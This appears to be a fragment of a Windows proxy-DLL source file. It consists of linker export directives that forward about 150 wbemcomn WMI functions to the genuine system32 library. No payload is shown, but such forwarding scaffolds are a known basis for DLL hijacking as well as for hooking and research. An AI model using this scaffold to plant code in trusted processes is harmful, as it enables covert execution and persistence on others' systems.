#pragma comment (linker, "/export:?PublishTemporaryEssStarted@CPublishWMIOperationEvent@@SAJPEAG00K00@Z=c:/windows/system32/wbemcomn.?PublishTemporaryEssStarted@CPublishWMIOperationEvent@@SAJPEAG00K00@Z,@983")
#pragma comment (linker, "/export:?Pushback@CWQLScanner@@AEAAHPEAUWSLexToken@@@Z=c:/windows/system32/wbemcomn.?Pushback@CWQLScanner@@AEAAHPEAUWSLexToken@@@Z,@984")
#pragma comment (linker, "/export:?Query@CTraceSessionControl@@SAK_KPEAGPEAPEAVCWMITraceSettings@@@Z=c:/windows/system32/wbemcomn.?Query@CTraceSessionControl@@SAK_KPEAGPEAPEAVCWMITraceSettings@@@Z,@985")
#pragma comment (linker, "/export:?QueryBlanket@CWbemCallSecurity@@UEAAJPEAK0PEAPEAG00PEAPEAX0@Z=c:/windows/system32/wbemcomn.?QueryBlanket@CWbemCallSecurity@@UEAAJPEAK0PEAPEAG00PEAPEAX0@Z,@986")
#pragma comment (linker, "/export:?QueryInterface@CBuffer@@UEAAJAEBU_GUID@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?QueryInterface@CBuffer@@UEAAJAEBU_GUID@@PEAPEAX@Z,@987")
#pragma comment (linker, "/export:?QueryInterface@CUnk@@UEAAJAEBU_GUID@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?QueryInterface@CUnk@@UEAAJAEBU_GUID@@PEAPEAX@Z,@988")
#pragma comment (linker, "/export:?QueryInterface@CUnkInternal@@UEAAJAEBU_GUID@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?QueryInterface@CUnkInternal@@UEAAJAEBU_GUID@@PEAPEAX@Z,@989")
#pragma comment (linker, "/export:?QueryInterface@CWbemCallSecurity@@UEAAJAEBU_GUID@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?QueryInterface@CWbemCallSecurity@@UEAAJAEBU_GUID@@PEAPEAX@Z,@990")
#pragma comment (linker, "/export:?QueueUnblockedWaitForSingleObject@CExecQueue@@SAKPEAXK@Z=c:/windows/system32/wbemcomn.?QueueUnblockedWaitForSingleObject@CExecQueue@@SAKPEAXK@Z,@991")
#pragma comment (linker, "/export:?QueueWaitForSingleObject@CExecQueue@@SAKPEAXK@Z=c:/windows/system32/wbemcomn.?QueueWaitForSingleObject@CExecQueue@@SAKPEAXK@Z,@992")
#pragma comment (linker, "/export:?Read@CBuffer@@UEAAJPEAXKPEAK@Z=c:/windows/system32/wbemcomn.?Read@CBuffer@@UEAAJPEAXKPEAK@Z,@993")
#pragma comment (linker, "/export:?ReadFromRegistry@CWMITraceSettings@@QEAAKPEBG@Z=c:/windows/system32/wbemcomn.?ReadFromRegistry@CWMITraceSettings@@QEAAKPEBG@Z,@994")
#pragma comment (linker, "/export:?ReadI64@@YAHPEBGAEFA_J@Z=c:/windows/system32/wbemcomn.?ReadI64@@YAHPEBGAEFA_J@Z,@995")
#pragma comment (linker, "/export:?ReadLPWSTR@CBuffer@@QEAAJAEAPEBG@Z=c:/windows/system32/wbemcomn.?ReadLPWSTR@CBuffer@@QEAAJAEAPEBG@Z,@996")
#pragma comment (linker, "/export:?ReadUI64@@YAHPEBGAEFA_K@Z=c:/windows/system32/wbemcomn.?ReadUI64@@YAHPEBGAEFA_K@Z,@997")
#pragma comment (linker, "/export:?Realloc@CWin32DefaultArena@@UEAAPEAXPEAX_K@Z=c:/windows/system32/wbemcomn.?Realloc@CWin32DefaultArena@@UEAAPEAXPEAX_K@Z,@998")
#pragma comment (linker, "/export:?ReduceSql89Joins@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?ReduceSql89Joins@CWQLScanner@@AEAAHXZ,@999")
#pragma comment (linker, "/export:?ReduceSql92Joins@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?ReduceSql92Joins@CWQLScanner@@AEAAHXZ,@1000")
#pragma comment (linker, "/export:?Register@CExecQueue@@KAXPEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?Register@CExecQueue@@KAXPEAVCThreadRecord@1@@Z,@1001")
#pragma comment (linker, "/export:?RegisterCMIFlushRepositoryCacheHook@CWbemInstallObject@@SAXP6AJH@Z@Z=c:/windows/system32/wbemcomn.?RegisterCMIFlushRepositoryCacheHook@CWbemInstallObject@@SAXP6AJH@Z@Z,@1002")
#pragma comment (linker, "/export:?RegisterDLL@@YAXPEAUHINSTANCE__@@U_GUID@@PEAG22@Z=c:/windows/system32/wbemcomn.?RegisterDLL@@YAXPEAUHINSTANCE__@@U_GUID@@PEAG22@Z,@1003")
#pragma comment (linker, "/export:?RegisterDllAppid@@YAJPEAUHINSTANCE__@@U_GUID@@PEAG222@Z=c:/windows/system32/wbemcomn.?RegisterDllAppid@@YAJPEAUHINSTANCE__@@U_GUID@@PEAG222@Z,@1004")
#pragma comment (linker, "/export:?Release@CBasicUnloadInstruction@@UEAAXXZ=c:/windows/system32/wbemcomn.?Release@CBasicUnloadInstruction@@UEAAXXZ,@1005")
#pragma comment (linker, "/export:?Release@CBuffer@@UEAAKXZ=c:/windows/system32/wbemcomn.?Release@CBuffer@@UEAAKXZ,@1006")
#pragma comment (linker, "/export:?Release@CContainerControl@@UEAAXPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?Release@CContainerControl@@UEAAXPEAUIUnknown@@@Z,@1007")
#pragma comment (linker, "/export:?Release@CExecQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?Release@CExecQueue@@QEAAXXZ,@1008")
#pragma comment (linker, "/export:?Release@CUnk@@UEAAKXZ=c:/windows/system32/wbemcomn.?Release@CUnk@@UEAAKXZ,@1009")
#pragma comment (linker, "/export:?Release@CUnkInternal@@UEAAKXZ=c:/windows/system32/wbemcomn.?Release@CUnkInternal@@UEAAKXZ,@1010")
#pragma comment (linker, "/export:?Release@CWbemCallSecurity@@UEAAKXZ=c:/windows/system32/wbemcomn.?Release@CWbemCallSecurity@@UEAAKXZ,@1011")
#pragma comment (linker, "/export:?Release@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXXZ=c:/windows/system32/wbemcomn.?Release@QL_LEVEL_1_RPN_EXPRESSION@@QEAAXXZ,@1012")
#pragma comment (linker, "/export:?RemainsUntil@CWbemTime@@QEBA?AVCWbemInterval@@AEBV1@@Z=c:/windows/system32/wbemcomn.?RemainsUntil@CWbemTime@@QEBA?AVCWbemInterval@@AEBV1@@Z,@1013")
#pragma comment (linker, "/export:?Remove@CInstructionQueue@@QEAAJPEAVCInstructionTest@@PEAPEAVCTimerInstruction@@@Z=c:/windows/system32/wbemcomn.?Remove@CInstructionQueue@@QEAAJPEAVCInstructionTest@@PEAPEAVCTimerInstruction@@@Z,@1014")
#pragma comment (linker, "/export:?Remove@CMinMaxLimitControl@@UEAAJK@Z=c:/windows/system32/wbemcomn.?Remove@CMinMaxLimitControl@@UEAAJK@Z,@1015")
#pragma comment (linker, "/export:?Remove@CTimerGenerator@@QEAAJPEAVCInstructionTest@@@Z=c:/windows/system32/wbemcomn.?Remove@CTimerGenerator@@QEAAJPEAVCInstructionTest@@@Z,@1016")
#pragma comment (linker, "/export:?RemoveAt@CFlexArray@@QEAAHH@Z=c:/windows/system32/wbemcomn.?RemoveAt@CFlexArray@@QEAAHH@Z,@1017")
#pragma comment (linker, "/export:?RemoveAt@CSafeArray@@QEAAHH@Z=c:/windows/system32/wbemcomn.?RemoveAt@CSafeArray@@QEAAHH@Z,@1018")
#pragma comment (linker, "/export:?RemoveAt@CSmallArrayBlob@@QEAAPEAV1@HPEAPEAX@Z=c:/windows/system32/wbemcomn.?RemoveAt@CSmallArrayBlob@@QEAAPEAV1@HPEAPEAX@Z,@1019")
#pragma comment (linker, "/export:?RemoveAt@CVarVector@@QEAAHH@Z=c:/windows/system32/wbemcomn.?RemoveAt@CVarVector@@QEAAHH@Z,@1020")
#pragma comment (linker, "/export:?RemoveAt@CWStringArray@@QEAAHH@Z=c:/windows/system32/wbemcomn.?RemoveAt@CWStringArray@@QEAAHH@Z,@1021")
#pragma comment (linker, "/export:?RemoveFileFromAutoRecoverFolder@@YAJPEBG@Z=c:/windows/system32/wbemcomn.?RemoveFileFromAutoRecoverFolder@@YAJPEBG@Z,@1022")
#pragma comment (linker, "/export:?RemoveMember@CLimitControl@@UEAAJXZ=c:/windows/system32/wbemcomn.?RemoveMember@CLimitControl@@UEAAJXZ,@1023")
#pragma comment (linker, "/export:?RemoveSelf@CClientOpsNode@@QEAAXXZ=c:/windows/system32/wbemcomn.?RemoveSelf@CClientOpsNode@@QEAAXXZ,@1024")
#pragma comment (linker, "/export:?ReplaceAt@CWStringArray@@QEAAHHPEAG@Z=c:/windows/system32/wbemcomn.?ReplaceAt@CWStringArray@@QEAAHHPEAG@Z,@1025")
#pragma comment (linker, "/export:?ReplaceClassName@QL1_Parser@@SAPEAGPEAUQL_LEVEL_1_RPN_EXPRESSION@@PEBG@Z=c:/windows/system32/wbemcomn.?ReplaceClassName@QL1_Parser@@SAPEAGPEAUQL_LEVEL_1_RPN_EXPRESSION@@PEBG@Z,@1026")
#pragma comment (linker, "/export:?Report@CEventLog@@QEAAHGAEBU_EVENT_DESCRIPTOR@@VCInsertionString@@111111111@Z=c:/windows/system32/wbemcomn.?Report@CEventLog@@QEAAHGAEBU_EVENT_DESCRIPTOR@@VCInsertionString@@111111111@Z,@1027")
#pragma comment (linker, "/export:?Requeue@CFlexQueue@@QEAA_NPEAX@Z=c:/windows/system32/wbemcomn.?Requeue@CFlexQueue@@QEAA_NPEAX@Z,@1028")
#pragma comment (linker, "/export:?Reread@CRegistryMinMaxLimitControl@@QEAAJXZ=c:/windows/system32/wbemcomn.?Reread@CRegistryMinMaxLimitControl@@QEAAJXZ,@1029")
#pragma comment (linker, "/export:?Reset@CBuffer@@QEAAXXZ=c:/windows/system32/wbemcomn.?Reset@CBuffer@@QEAAXXZ,@1030")
#pragma comment (linker, "/export:?Reset@CMRCIControl@@QEAAXXZ=c:/windows/system32/wbemcomn.?Reset@CMRCIControl@@QEAAXXZ,@1031")
#pragma comment (linker, "/export:?ResetDate@CDateTimeParser@@IEAAXH@Z=c:/windows/system32/wbemcomn.?ResetDate@CDateTimeParser@@IEAAXH@Z,@1032")
#pragma comment (linker, "/export:?ResetDateTime@CDateTimeParser@@IEAAXH@Z=c:/windows/system32/wbemcomn.?ResetDateTime@CDateTimeParser@@IEAAXH@Z,@1033")
#pragma comment (linker, "/export:?ResetQueue@CFlexQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?ResetQueue@CFlexQueue@@QEAAXXZ,@1034")
#pragma comment (linker, "/export:?ResetTime@CDateTimeParser@@IEAAXH@Z=c:/windows/system32/wbemcomn.?ResetTime@CDateTimeParser@@IEAAXH@Z,@1035")
#pragma comment (linker, "/export:?Resize@CNtAcl@@QEAAHK@Z=c:/windows/system32/wbemcomn.?Resize@CNtAcl@@QEAAHK@Z,@1036")
#pragma comment (linker, "/export:?Resume@CHaltable@@QEAAJXZ=c:/windows/system32/wbemcomn.?Resume@CHaltable@@QEAAJXZ,@1037")
#pragma comment (linker, "/export:?ResumeAll@CHaltable@@QEAAJXZ=c:/windows/system32/wbemcomn.?ResumeAll@CHaltable@@QEAAJXZ,@1038")
#pragma comment (linker, "/export:?RetrieveSidFromCall@@YAJAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?RetrieveSidFromCall@@YAJAEAVCNtSid@@@Z,@1039")
#pragma comment (linker, "/export:?RetrieveSidFromCall@CIdentitySecurity@@AEAAJAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?RetrieveSidFromCall@CIdentitySecurity@@AEAAJAEAVCNtSid@@@Z,@1040")
#pragma comment (linker, "/export:?RetrieveSidFromToken@@YAJPEAXAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?RetrieveSidFromToken@@YAJPEAXAEAVCNtSid@@@Z,@1041")
#pragma comment (linker, "/export:?ReturnEscapedReturns@CTextTemplate@@AEAAPEAGPEAG@Z=c:/windows/system32/wbemcomn.?ReturnEscapedReturns@CTextTemplate@@AEAAPEAGPEAG@Z,@1042")
#pragma comment (linker, "/export:?Revert@CBuffer@@UEAAJXZ=c:/windows/system32/wbemcomn.?Revert@CBuffer@@UEAAJXZ,@1043")
#pragma comment (linker, "/export:?RevertToSelf@CWbemCallSecurity@@UEAAJXZ=c:/windows/system32/wbemcomn.?RevertToSelf@CWbemCallSecurity@@UEAAJXZ,@1044")
#pragma comment (linker, "/export:?ScheduleFreeUnusedLibraries@CTimerGenerator@@QEAAXXZ=c:/windows/system32/wbemcomn.?ScheduleFreeUnusedLibraries@CTimerGenerator@@QEAAXXZ,@1045")
#pragma comment (linker, "/export:?SchedulerThread@CTimerGenerator@@CAKPEAX@Z=c:/windows/system32/wbemcomn.?SchedulerThread@CTimerGenerator@@CAKPEAX@Z,@1046")
#pragma comment (linker, "/export:?SearchForRecord@CEventLog@@IEAAHPEAVCEventLogRecord@@@Z=c:/windows/system32/wbemcomn.?SearchForRecord@CEventLog@@IEAAHPEAVCEventLogRecord@@@Z,@1047")
#pragma comment (linker, "/export:?SearchForSuitableRequest@CExecQueue@@MEAAPEAVCExecRequest@@PEAVCThreadRecord@1@@Z=c:/windows/system32/wbemcomn.?SearchForSuitableRequest@CExecQueue@@MEAAPEAVCExecRequest@@PEAVCThreadRecord@1@@Z,@1048")
#pragma comment (linker, "/export:?Seek@CBuffer@@UEAAJT_LARGE_INTEGER@@KPEAT_ULARGE_INTEGER@@@Z=c:/windows/system32/wbemcomn.?Seek@CBuffer@@UEAAJT_LARGE_INTEGER@@KPEAT_ULARGE_INTEGER@@@Z,@1049")
#pragma comment (linker, "/export:?SelectList@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?SelectList@CWQLScanner@@AEAAHXZ,@1050")
#pragma comment (linker, "/export:?Serialize@C9XAce@@UEAA_NPEAE_K@Z=c:/windows/system32/wbemcomn.?Serialize@C9XAce@@UEAA_NPEAE_K@Z,@1051")
#pragma comment (linker, "/export:?Serialize@CNtAce@@UEAA_NPEAE_K@Z=c:/windows/system32/wbemcomn.?Serialize@CNtAce@@UEAA_NPEAE_K@Z,@1052")
#pragma comment (linker, "/export:?Set100nss@CWbemTime@@QEAAX_J@Z=c:/windows/system32/wbemcomn.?Set100nss@CWbemTime@@QEAAX_J@Z,@1053")
#pragma comment (linker, "/export:?Set@CTimerGenerator@@QEAAJPEAVCTimerInstruction@@VCWbemTime@@@Z=c:/windows/system32/wbemcomn.?Set@CTimerGenerator@@QEAAJPEAVCTimerInstruction@@VCWbemTime@@@Z,@1054")
#pragma comment (linker, "/export:?SetAggregated@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ=c:/windows/system32/wbemcomn.?SetAggregated@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ,@1055")
#pragma comment (linker, "/export:?SetAggregationTolerance@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Tolerance@@@Z=c:/windows/system32/wbemcomn.?SetAggregationTolerance@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXAEBU_tag_WbemQl1Tolerance@@@Z,@1056")
#pragma comment (linker, "/export:?SetAreaFlags@CWMITraceSettings@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetAreaFlags@CWMITraceSettings@@QEAAXK@Z,@1057")
#pragma comment (linker, "/export:?SetAsNull@CVar@@QEAAXXZ=c:/windows/system32/wbemcomn.?SetAsNull@CVar@@QEAAXXZ,@1058")
#pragma comment (linker, "/export:?SetAt@CFlexArray@@QEAAXHPEAX@Z=c:/windows/system32/wbemcomn.?SetAt@CFlexArray@@QEAAXHPEAX@Z,@1059")
#pragma comment (linker, "/export:?SetAt@CSmallArrayBlob@@QEAAPEAV1@HPEAXPEAPEAX@Z=c:/windows/system32/wbemcomn.?SetAt@CSmallArrayBlob@@QEAAPEAV1@HPEAXPEAPEAX@Z,@1060")
#pragma comment (linker, "/export:?SetAt@CWStringArray@@QEAAHHPEBG@Z=c:/windows/system32/wbemcomn.?SetAt@CWStringArray@@QEAAHHPEBG@Z,@1061")
#pragma comment (linker, "/export:?SetAutoRecoverFolder@CWbemInstallObject@@SAXPEBG@Z=c:/windows/system32/wbemcomn.?SetAutoRecoverFolder@CWbemInstallObject@@SAXPEBG@Z,@1062")
#pragma comment (linker, "/export:?SetBSTR@CVar@@QEAAHPEAG@Z=c:/windows/system32/wbemcomn.?SetBSTR@CVar@@QEAAHPEAG@Z,@1063")
#pragma comment (linker, "/export:?SetBSTR@CVar@@QEAAHVauto_bstr@@@Z=c:/windows/system32/wbemcomn.?SetBSTR@CVar@@QEAAHVauto_bstr@@@Z,@1064")
#pragma comment (linker, "/export:?SetBSTRAt@CSafeArray@@QEAAHHPEAG@Z=c:/windows/system32/wbemcomn.?SetBSTRAt@CSafeArray@@QEAAHHPEAG@Z,@1065")
#pragma comment (linker, "/export:?SetBinary@Registry@@QEAAHPEBGPEAEK@Z=c:/windows/system32/wbemcomn.?SetBinary@Registry@@QEAAHPEBGPEAEK@Z,@1066")
#pragma comment (linker, "/export:?SetBinaryPath@CWbemInstallObject@@SAXPEBG@Z=c:/windows/system32/wbemcomn.?SetBinaryPath@CWbemInstallObject@@SAXPEBG@Z,@1067")
#pragma comment (linker, "/export:?SetBlob@CVar@@QEAAXPEAUtagBLOB@@H@Z=c:/windows/system32/wbemcomn.?SetBlob@CVar@@QEAAXPEAUtagBLOB@@H@Z,@1068")
#pragma comment (linker, "/export:?SetBool@CVar@@QEAAXF@Z=c:/windows/system32/wbemcomn.?SetBool@CVar@@QEAAXF@Z,@1069")
#pragma comment (linker, "/export:?SetBoolAt@CSafeArray@@QEAAHHF@Z=c:/windows/system32/wbemcomn.?SetBoolAt@CSafeArray@@QEAAHHF@Z,@1070")
#pragma comment (linker, "/export:?SetByte@CVar@@QEAAXE@Z=c:/windows/system32/wbemcomn.?SetByte@CVar@@QEAAXE@Z,@1071")
#pragma comment (linker, "/export:?SetByteAt@CSafeArray@@QEAAHHE@Z=c:/windows/system32/wbemcomn.?SetByteAt@CSafeArray@@QEAAHHE@Z,@1072")
#pragma comment (linker, "/export:?SetCanDelete@CVar@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetCanDelete@CVar@@QEAAXH@Z,@1073")
#pragma comment (linker, "/export:?SetChar@CVar@@QEAAXD@Z=c:/windows/system32/wbemcomn.?SetChar@CVar@@QEAAXD@Z,@1074")
#pragma comment (linker, "/export:?SetClassName@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXPEBG@Z=c:/windows/system32/wbemcomn.?SetClassName@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXPEBG@Z,@1075")
#pragma comment (linker, "/export:?SetClsId@CVar@@QEAAXPEAU_GUID@@H@Z=c:/windows/system32/wbemcomn.?SetClsId@CVar@@QEAAXPEAU_GUID@@H@Z,@1076")
#pragma comment (linker, "/export:?SetCountQuery@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ=c:/windows/system32/wbemcomn.?SetCountQuery@QL_LEVEL_1_RPN_EXPRESSION@@UEAAXXZ,@1077")
#pragma comment (linker, "/export:?SetDMTF@CWbemTime@@QEAAHPEBG@Z=c:/windows/system32/wbemcomn.?SetDMTF@CWbemTime@@QEAAHPEBG@Z,@1078")
#pragma comment (linker, "/export:?SetDWORD@CVar@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetDWORD@CVar@@QEAAXK@Z,@1079")
#pragma comment (linker, "/export:?SetDWORD@Registry@@QEAAHPEBGK@Z=c:/windows/system32/wbemcomn.?SetDWORD@Registry@@QEAAHPEBGK@Z,@1080")
#pragma comment (linker, "/export:?SetDWORDStr@Registry@@QEAAHPEBGK@Z=c:/windows/system32/wbemcomn.?SetDWORDStr@Registry@@QEAAHPEBGK@Z,@1081")
#pragma comment (linker, "/export:?SetDacl@CNtSecurityDescriptor@@QEAAHPEAVCNtAcl@@@Z=c:/windows/system32/wbemcomn.?SetDacl@CNtSecurityDescriptor@@QEAAHPEAVCNtAcl@@@Z,@1082")
#pragma comment (linker, "/export:?SetDate@CDatePart@@QEAAJPEBD@Z=c:/windows/system32/wbemcomn.?SetDate@CDatePart@@QEAAJPEBD@Z,@1083")
#pragma comment (linker, "/export:?SetDate@CDatePart@@QEAAJPEBG@Z=c:/windows/system32/wbemcomn.?SetDate@CDatePart@@QEAAJPEBG@Z,@1084")
#pragma comment (linker, "/export:?SetDateTime@CDateTimeParser@@QEAAHPEBG@Z=c:/windows/system32/wbemcomn.?SetDateTime@CDateTimeParser@@QEAAHPEBG@Z,@1085")
#pragma comment (linker, "/export:?SetDefaultValues@CWMITraceSettings@@QEAAKXZ=c:/windows/system32/wbemcomn.?SetDefaultValues@CWMITraceSettings@@QEAAKXZ,@1086")
#pragma comment (linker, "/export:?SetDestructorPolicy@CSafeArray@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetDestructorPolicy@CSafeArray@@QEAAXH@Z,@1087")
#pragma comment (linker, "/export:?SetDispatch@CVar@@QEAAXPEAUIDispatch@@@Z=c:/windows/system32/wbemcomn.?SetDispatch@CVar@@QEAAXPEAUIDispatch@@@Z,@1088")
#pragma comment (linker, "/export:?SetDispatchAt@CSafeArray@@QEAAHHPEAUIDispatch@@@Z=c:/windows/system32/wbemcomn.?SetDispatchAt@CSafeArray@@QEAAHHPEAUIDispatch@@@Z,@1089")
#pragma comment (linker, "/export:?SetDouble@CVar@@QEAAXN@Z=c:/windows/system32/wbemcomn.?SetDouble@CVar@@QEAAXN@Z,@1090")
#pragma comment (linker, "/export:?SetDoubleAt@CSafeArray@@QEAAHHN@Z=c:/windows/system32/wbemcomn.?SetDoubleAt@CSafeArray@@QEAAHHN@Z,@1091")
#pragma comment (linker, "/export:?SetEmbeddedObject@CVar@@QEAAXPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?SetEmbeddedObject@CVar@@QEAAXPEAUIUnknown@@@Z,@1092")
#pragma comment (linker, "/export:?SetExpandStr@Registry@@QEAAHPEBG0@Z=c:/windows/system32/wbemcomn.?SetExpandStr@Registry@@QEAAHPEBG0@Z,@1093")
#pragma comment (linker, "/export:?SetExpression@CLike@@QEAAXPEBGG@Z=c:/windows/system32/wbemcomn.?SetExpression@CLike@@QEAAXPEBGG@Z,@1094")
#pragma comment (linker, "/export:?SetFailure@CStaticCritSec@@SAXXZ=c:/windows/system32/wbemcomn.?SetFailure@CStaticCritSec@@SAXXZ,@1095")
#pragma comment (linker, "/export:?SetFileTime@CVar@@QEAAXPEAU_FILETIME@@@Z=c:/windows/system32/wbemcomn.?SetFileTime@CVar@@QEAAXPEAU_FILETIME@@@Z,@1096")
#pragma comment (linker, "/export:?SetFileTime@CWbemTime@@QEAAHAEBU_FILETIME@@@Z=c:/windows/system32/wbemcomn.?SetFileTime@CWbemTime@@QEAAHAEBU_FILETIME@@@Z,@1097")
#pragma comment (linker, "/export:?SetFlags@C9XAce@@UEAAXJ@Z=c:/windows/system32/wbemcomn.?SetFlags@C9XAce@@UEAAXJ@Z,@1098")
#pragma comment (linker, "/export:?SetFlags@CNtAce@@UEAAXJ@Z=c:/windows/system32/wbemcomn.?SetFlags@CNtAce@@UEAAXJ@Z,@1099")
#pragma comment (linker, "/export:?SetFloat@CVar@@QEAAXM@Z=c:/windows/system32/wbemcomn.?SetFloat@CVar@@QEAAXM@Z,@1100")
#pragma comment (linker, "/export:?SetFloatAt@CSafeArray@@QEAAHHM@Z=c:/windows/system32/wbemcomn.?SetFloatAt@CSafeArray@@QEAAHHM@Z,@1101")
#pragma comment (linker, "/export:?SetFromAbsoluteCopy@CNtSecurityDescriptor@@QEAAHPEAUSNtAbsoluteSD@@@Z=c:/windows/system32/wbemcomn.?SetFromAbsoluteCopy@CNtSecurityDescriptor@@QEAAHPEAUSNtAbsoluteSD@@@Z,@1102")
#pragma comment (linker, "/export:?SetGroup@CNtSecurityDescriptor@@QEAAHPEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?SetGroup@CNtSecurityDescriptor@@QEAAHPEAVCNtSid@@@Z,@1103")
#pragma comment (linker, "/export:?SetGrowGranularity@CSafeArray@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetGrowGranularity@CSafeArray@@QEAAXH@Z,@1104")
#pragma comment (linker, "/export:?SetHandle@CPropertyName@@QEAAXPEAX@Z=c:/windows/system32/wbemcomn.?SetHandle@CPropertyName@@QEAAXPEAX@Z,@1105")
#pragma comment (linker, "/export:?SetIdleTimeout@CExecQueue@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetIdleTimeout@CExecQueue@@QEAAXK@Z,@1106")
#pragma comment (linker, "/export:?SetInfo@CClientOpsNode@@QEAAXPEAX@Z=c:/windows/system32/wbemcomn.?SetInfo@CClientOpsNode@@QEAAXPEAX@Z,@1107")
#pragma comment (linker, "/export:?SetInterval@CBasicUnloadInstruction@@QEAAXAEAVCWbemInterval@@@Z=c:/windows/system32/wbemcomn.?SetInterval@CBasicUnloadInstruction@@QEAAXAEAVCWbemInterval@@@Z,@1108")
#pragma comment (linker, "/export:?SetLPSTR@CVar@@QEAAHPEADH@Z=c:/windows/system32/wbemcomn.?SetLPSTR@CVar@@QEAAHPEADH@Z,@1109")
#pragma comment (linker, "/export:?SetLPWSTR@CVar@@QEAAHPEAGH@Z=c:/windows/system32/wbemcomn.?SetLPWSTR@CVar@@QEAAHPEAGH@Z,@1110")
#pragma comment (linker, "/export:?SetLogingEnabled@CMemoryLog@@QEAAX_N@Z=c:/windows/system32/wbemcomn.?SetLogingEnabled@CMemoryLog@@QEAAX_N@Z,@1111")
#pragma comment (linker, "/export:?SetLong@CVar@@QEAAXJ@Z=c:/windows/system32/wbemcomn.?SetLong@CVar@@QEAAXJ@Z,@1112")
#pragma comment (linker, "/export:?SetLongAt@CSafeArray@@QEAAHHJ@Z=c:/windows/system32/wbemcomn.?SetLongAt@CSafeArray@@QEAAHHJ@Z,@1113")
#pragma comment (linker, "/export:?SetMax@CMinMaxLimitControl@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetMax@CMinMaxLimitControl@@QEAAXK@Z,@1114")
#pragma comment (linker, "/export:?SetMilliseconds@CWbemInterval@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetMilliseconds@CWbemInterval@@QEAAXK@Z,@1115")
#pragma comment (linker, "/export:?SetMin@CMinMaxLimitControl@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetMin@CMinMaxLimitControl@@QEAAXK@Z,@1116")
#pragma comment (linker, "/export:?SetMultiStr@Registry@@QEAAHPEBGPEAGK@Z=c:/windows/system32/wbemcomn.?SetMultiStr@Registry@@QEAAHPEBGPEAGK@Z,@1117")
#pragma comment (linker, "/export:?SetNext@CExecRequest@@QEAAXPEAV1@@Z=c:/windows/system32/wbemcomn.?SetNext@CExecRequest@@QEAAXPEAV1@@Z,@1118")
#pragma comment (linker, "/export:?SetObjectAccess2@@YAHPEAX@Z=c:/windows/system32/wbemcomn.?SetObjectAccess2@@YAHPEAX@Z,@1119")
#pragma comment (linker, "/export:?SetOffline@CWbemInstallObject@@SAX_N@Z=c:/windows/system32/wbemcomn.?SetOffline@CWbemInstallObject@@SAX_N@Z,@1120")
#pragma comment (linker, "/export:?SetOverflowIdleTimeout@CExecQueue@@QEAAXK@Z=c:/windows/system32/wbemcomn.?SetOverflowIdleTimeout@CExecQueue@@QEAAXK@Z,@1121")
#pragma comment (linker, "/export:?SetOwner@CNtSecurityDescriptor@@QEAAHPEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.?SetOwner@CNtSecurityDescriptor@@QEAAHPEAVCNtSid@@@Z,@1122")
#pragma comment (linker, "/export:?SetPersistentCfgValue@CPersistentConfig@@QEAAHKK@Z=c:/windows/system32/wbemcomn.?SetPersistentCfgValue@CPersistentConfig@@QEAAHKK@Z,@1123")
#pragma comment (linker, "/export:?SetPreferredLanguages@CMUILocale@@SAJKPEBGPEAK@Z=c:/windows/system32/wbemcomn.?SetPreferredLanguages@CMUILocale@@SAJKPEBGPEAK@Z,@1124")
#pragma comment (linker, "/export:?SetPriority@CExecRequest@@QEAAXJ@Z=c:/windows/system32/wbemcomn.?SetPriority@CExecRequest@@QEAAXJ@Z,@1125")
#pragma comment (linker, "/export:?SetQWORD@Registry@@QEAAHPEBG_K@Z=c:/windows/system32/wbemcomn.?SetQWORD@Registry@@QEAAHPEBG_K@Z,@1126")
#pragma comment (linker, "/export:?SetRaw@CVar@@QEAAXHPEAXH@Z=c:/windows/system32/wbemcomn.?SetRaw@CVar@@QEAAXHPEAXH@Z,@1127")
#pragma comment (linker, "/export:?SetRawArrayBinding@CVarVector@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetRawArrayBinding@CVarVector@@QEAAXH@Z,@1128")
#pragma comment (linker, "/export:?SetRawArrayData@CVarVector@@QEAAJPEAXHH@Z=c:/windows/system32/wbemcomn.?SetRawArrayData@CVarVector@@QEAAJPEAXHH@Z,@1129")
#pragma comment (linker, "/export:?SetRawArrayMaxElement@CSafeArray@@QEAAXH@Z=c:/windows/system32/wbemcomn.?SetRawArrayMaxElement@CSafeArray@@QEAAXH@Z,@1130")
#pragma comment (linker, "/export:?SetRawArraySize@CVarVector@@QEAAHH@Z=c:/windows/system32/wbemcomn.?SetRawArraySize@CVarVector@@QEAAHH@Z,@1131")
#pragma comment (linker, "/export:?SetRawData@CSafeArray@@QEAAHPEAXHH@Z=c:/windows/system32/wbemcomn.?SetRawData@CSafeArray@@QEAAHPEAXHH@Z,@1132")
